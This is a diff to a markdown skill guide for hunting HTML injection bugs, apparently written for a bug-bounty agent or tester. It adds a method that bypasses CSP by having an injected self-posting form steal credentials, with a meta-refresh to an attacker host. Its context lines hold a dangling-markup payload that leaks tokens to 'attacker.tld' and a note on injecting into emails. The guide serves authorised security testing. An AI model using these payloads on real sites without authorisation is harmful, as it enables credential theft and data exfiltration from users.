@@ -2,7 +2,7 @@
 name: hunt-html-injection
 description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
 sources: hackerone_public, public_research
-report_count: 6
+report_count: 7
 ---
 
 ## What is HTML Injection
@@ -19,6 +19,7 @@ HTML Injection occurs when user input is inserted into a page's HTML without esc
 - Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
 - **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
 - **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.
+- **CSP doesn't stop a self-posting form** — on a page where `<script>` is fully blocked (even `default-src 'none'`), check `form-action` separately: it does **not** inherit from `default-src`/`script-src`, so if it's absent (or set to `'self'`) an injected `<form>` with no `action` attribute still submits back to the *current* page. Inject a form that captures the login/sensitive fields, let the victim submit it, then have the page reflect a second-stage snippet (passed through the same injected parameter) that triggers a delayed `<meta http-equiv="refresh">` navigation to an attacker host — the captured values ride along in the `Referer` header of that navigation (query-string values are part of the URL the browser reports as referrer), no JavaScript execution required anywhere in the chain. Always read every enforced CSP header (not report-only ones) and confirm `form-action` explicitly before ruling out HTML-injection-only credential theft. Source: PortSwigger Research, "Blind trust: stealing credentials through CSP" — <https://portswigger.net/research/blind-trust-stealing-credentials-through-csp>.
 
 ## Attack Surface
 
